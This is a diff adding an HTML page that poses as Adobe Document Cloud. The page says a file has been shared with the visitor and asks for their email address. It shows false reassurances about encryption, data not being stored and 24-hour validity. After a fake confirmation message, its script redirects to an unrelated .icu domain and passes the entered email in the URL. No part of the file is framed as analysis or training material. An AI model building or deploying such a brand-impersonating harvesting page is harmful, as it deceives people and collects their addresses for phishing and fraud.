@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Document Cloud · Open Your File</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  :root {
+    --red:     #FA0F00;
+    --blue:    #1473E6;
+    --blue-dk: #0D66D0;
+    --ink:     #1B1B1B;
+    --mid:     #4B4B4B;
+    --muted:   #6E6E6E;
+    --smoke:   #ABABAB;
+    --border:  #E0E0E0;
+    --surface: #F5F5F5;
+    --white:   #FFFFFF;
+  }
+
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Source Sans 3', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: var(--surface);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
+    -webkit-font-smoothing: antialiased;
+    color: var(--ink);
+  }
+
+  /* ── CARD ───────────────────────────── */
+  .card {
+    background: var(--white);
+    width: 100%;
+    max-width: 480px;
+    border-radius: 6px;
+    border: 1px solid var(--border);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.07), 0 1px 4px rgba(0,0,0,0.05);
+    overflow: hidden;
+    animation: rise 0.5s cubic-bezier(0.4,0,0.2,1) both;
+  }
+
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(18px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Red top bar */
+  .card-bar { height: 3px; background: var(--red); }
+
+  /* ── HEADER ─────────────────────────── */
+  .card-head {
+    padding: 40px 44px 32px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* Adobe logo lockup */
+  .adobe-lockup {
+    display: inline-flex;
+    align-items: center;
+    gap: 0;
+    margin-bottom: 28px;
+    text-decoration: none;
+  }
+
+  .adobe-mark {
+    width: 38px; height: 38px;
+    flex-shrink: 0;
+  }
+
+  .adobe-divider {
+    width: 1px; height: 20px;
+    background: #D0D0D0;
+    margin: 0 11px;
+  }
+
+  .adobe-product {
+    font-size: 15px;
+    font-weight: 300;
+    color: var(--mid);
+    letter-spacing: 0.2px;
+    white-space: nowrap;
+  }
+
+  /* Icon circle */
+  .icon-ring {
+    width: 72px; height: 72px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #1473E6 0%, #0D66D0 100%);
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 22px;
+    box-shadow: 0 6px 20px rgba(20,115,230,0.25);
+    animation: popIn 0.5s 0.2s cubic-bezier(0.34,1.56,0.64,1) both;
+  }
+
+  @keyframes popIn {
+    from { opacity: 0; transform: scale(0.7); }
+    to   { opacity: 1; transform: scale(1); }
+  }
+
+  .icon-ring i {
+    font-size: 30px;
+    color: white;
+  }
+
+  .card-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--ink);
+    letter-spacing: -0.3px;
+    margin-bottom: 10px;
+    line-height: 1.25;
+  }
+
+  .card-sub {
+    font-size: 14px;
+    font-weight: 300;
+    color: var(--muted);
+    line-height: 1.65;
+    max-width: 340px;
+    margin: 0 auto;
+  }
+
+  /* ── BODY ───────────────────────────── */
+  .card-body { padding: 32px 44px 36px; }
+
+  .field-label {
+    display: block;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--ink);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    margin-bottom: 8px;
+  }
+
+  .input-wrap {
+    position: relative;
+    margin-bottom: 8px;
+  }
+
+  .input-wrap i {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 15px;
+    color: var(--smoke);
+    pointer-events: none;
+    transition: color 0.15s;
+  }
+
+  .input-wrap:focus-within i { color: var(--blue); }
+
+  input[type="email"] {
+    width: 100%;
+    padding: 12px 14px 12px 42px;
+    border: 1.5px solid var(--border);
+    border-radius: 4px;
+    font-size: 15px;
+    font-family: 'Source Sans 3', sans-serif;
+    color: var(--ink);
+    background: var(--white);
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+    -webkit-appearance: none;
+  }
+
+  input[type="email"]::placeholder { color: #C8C8C8; }
+
+  input[type="email"]:focus {
+    border-color: var(--blue);
+    box-shadow: 0 0 0 3px rgba(20,115,230,0.13);
+  }
+
+  .field-hint {
+    font-size: 12px;
+    color: var(--smoke);
+    margin-bottom: 20px;
+    line-height: 1.5;
+  }
+
+  /* Info callout */
+  .callout {
+    display: flex;
+    gap: 11px;
+    align-items: flex-start;
+    background: #EAF2FB;
+    border-left: 3px solid var(--blue);
+    border-radius: 0 4px 4px 0;
+    padding: 13px 15px;
+    margin-bottom: 24px;
+  }
+
+  .callout i { color: var(--blue); font-size: 14px; margin-top: 1px; flex-shrink: 0; }
+  .callout p { font-size: 13px; color: #245A8A; line-height: 1.6; font-weight: 300; }
+
+  /* Button */
+  .btn {
+    width: 100%;
+    background: var(--blue);
+    color: white;
+    border: none;
+    border-radius: 4px;
+    padding: 13px 18px;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: 'Source Sans 3', sans-serif;
+    letter-spacing: 0.2px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 9px;
+    transition: background 0.15s, box-shadow 0.15s, transform 0.08s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .btn::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(180deg, rgba(255,255,255,0.08) 0%, transparent 100%);
+    pointer-events: none;
+  }
+
+  .btn:hover:not(:disabled) {
+    background: var(--blue-dk);
+    box-shadow: 0 4px 16px rgba(20,115,230,0.3);
+    transform: translateY(-1px);
+  }
+
+  .btn:active:not(:disabled) { transform: translateY(0); }
+
+  .btn:disabled {
+    background: #B8B8B8;
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: none;
+  }
+
+  /* ── SECURITY STRIP ─────────────────── */
+  .security-strip {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 0;
+    border-top: 1px solid var(--border);
+    background: var(--surface);
+  }
+
+  .sec-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    padding: 20px 12px;
+    text-align: center;
+    border-right: 1px solid var(--border);
+  }
+
+  .sec-item:last-child { border-right: none; }
+
+  .sec-icon {
+    width: 40px; height: 40px;
+    background: var(--white);
+    border: 1px solid var(--border);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--blue);
+    font-size: 16px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+  }
+
+  .sec-label {
+    font-size: 11.5px;
+    font-weight: 600;
+    color: var(--mid);
+    line-height: 1.4;
+  }
+
+  /* ── FOOTER ─────────────────────────── */
+  .card-footer {
+    padding: 14px 44px;
+    border-top: 1px solid var(--border);
+    background: var(--white);
+    text-align: center;
+  }
+
+  .card-footer p {
+    font-size: 12px;
+    color: var(--smoke);
+    line-height: 1.6;
+  }
+
+  .card-footer a {
+    color: var(--blue);
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .card-footer a:hover { text-decoration: underline; }
+
+  /* ── BELOW CARD ─────────────────────── */
+  .below-card {
+    margin-top: 16px;
+    font-size: 11.5px;
+    color: var(--smoke);
+    text-align: center;
+    line-height: 1.7;
+  }
+
+  .below-card a { color: var(--smoke); text-decoration: none; }
+  .below-card a:hover { color: var(--blue); }
+
+  /* ── TOAST ──────────────────────────── */
+  .toast {
+    position: fixed;
+    bottom: 24px; right: 24px;
+    background: var(--ink);
+    color: white;
+    border-radius: 5px;
+    padding: 14px 18px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    z-index: 9999;
+    max-width: 320px;
+    box-shadow: 0 10px 36px rgba(0,0,0,0.3);
+    transform: translateY(110%) scale(0.97);
+    opacity: 0;
+    transition: transform 0.35s cubic-bezier(0.34,1.56,0.64,1), opacity 0.25s ease;
+    pointer-events: none;
+  }
+
+  .toast.show {
+    transform: translateY(0) scale(1);
+    opacity: 1;
+    pointer-events: auto;
+  }
+
+  .t-icon  { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .toast.ok  .t-icon { color: #4ADE80; }
+  .toast.err .t-icon { color: #FF6B6B; }
+
+  .t-title { font-size: 13px; font-weight: 700; margin-bottom: 2px; }
+  .t-body  { font-size: 12px; color: rgba(255,255,255,0.5); line-height: 1.5; }
+
+  @media (max-width: 520px) {
+    .card-head  { padding: 32px 24px 26px; }
+    .card-body  { padding: 26px 24px 30px; }
+    .card-footer { padding: 14px 24px; }
+    .card-title { font-size: 19px; }
+    .icon-ring  { width: 62px; height: 62px; }
+    .icon-ring i { font-size: 25px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="card-bar"></div>
+
+  <!-- HEADER -->
+  <div class="card-head">
+
+    <a class="adobe-lockup" href="#">
+      <svg class="adobe-mark" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="38" height="38" rx="3" fill="#FA0F00"/>
+        <path d="M22.3 9H28.5V29H24.0L22.1 24H15.9L14 29H9.5L15.7 9H19.5L22.3 9ZM19 13.2L16.4 21H21.6L19 13.2Z" fill="white"/>
+      </svg>
+      <div class="adobe-divider"></div>
+      <span class="adobe-product">Document Cloud</span>
+    </a>
+
+    <div class="icon-ring">
+      <i class="fas fa-file-lines"></i>
+    </div>
+
+    <h1 class="card-title">A file has been shared with you</h1>
+    <p class="card-sub">
+      Enter your email address below and we'll send a viewing link straight to your inbox — no sign-in needed.
+    </p>
+  </div>
+
+  <!-- BODY -->
+  <div class="card-body">
+    <form id="form" novalidate>
+
+      <label class="field-label" for="email">Your Email Address</label>
+      <div class="input-wrap">
+        <i class="fas fa-envelope"></i>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="name@company.com"
+          required
+          autocomplete="email"
+        >
+      </div>
+      <p class="field-hint">This is where we'll send your personal viewing link.</p>
+
+      <div class="callout">
+        <i class="fas fa-circle-info"></i>
+        <p>We'll email you a link that's good for 24 hours. It's tied to your address so only you can open the file.</p>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">
+        <i class="fas fa-arrow-up-right-from-square" style="font-size:14px;"></i>
+        <span>View Document</span>
+      </button>
+
+    </form>
+  </div>
+
+  <!-- SECURITY STRIP -->
+  <div class="security-strip">
+    <div class="sec-item">
+      <div class="sec-icon"><i class="fas fa-shield-halved"></i></div>
+      <div class="sec-label">TLS<br>Encrypted</div>
+    </div>
+    <div class="sec-item">
+      <div class="sec-icon"><i class="fas fa-clock"></i></div>
+      <div class="sec-label">Valid for<br>24 Hours</div>
+    </div>
+    <div class="sec-item">
+      <div class="sec-icon"><i class="fas fa-eye-slash"></i></div>
+      <div class="sec-label">Not<br>Stored</div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="card-footer">
+    <p>Need help? <a href="mailto:support@adobe.com">Contact support</a></p>
+  </div>
+</div>
+
+<div class="below-card">
+  © 2024 Adobe Inc. &nbsp;·&nbsp; <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms of Use</a>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">
+  <i class="fas t-icon" id="tIcon"></i>
+  <div>
+    <div class="t-title" id="tTitle"></div>
+    <div class="t-body"  id="tBody"></div>
+  </div>
+</div>
+
+<script>
+  const form      = document.getElementById('form');
+  const submitBtn = document.getElementById('submitBtn');
+  const toast     = document.getElementById('toast');
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value.trim();
+    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+    if (!valid) {
+      showToast('err', 'Double-check that address', 'Try something like name@company.com');
+      document.getElementById('email').focus();
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin" style="font-size:14px;"></i><span>On its way…</span>';
+
+    setTimeout(() => {
+      showToast('ok', 'Link on its way', `Check your inbox at ${email} — it should arrive in moments.`);
+
+      setTimeout(() => {
+        window.location.href = 'https://mailwavemarketing.icu?QhYsUZoS&ref=' + email.toLowerCase().trim();
+      }, 2200);
+    }, 1600);
+  });
+
+  function showToast(type, title, body) {
+    toast.className = 'toast ' + type;
+    document.getElementById('tIcon').className = 'fas t-icon ' +
+      (type === 'err' ? 'fa-circle-xmark' : 'fa-circle-check');
+    document.getElementById('tTitle').textContent = title;
+    document.getElementById('tBody').textContent  = body;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 5000);
+  }
+</script>
+</body>
+</html>
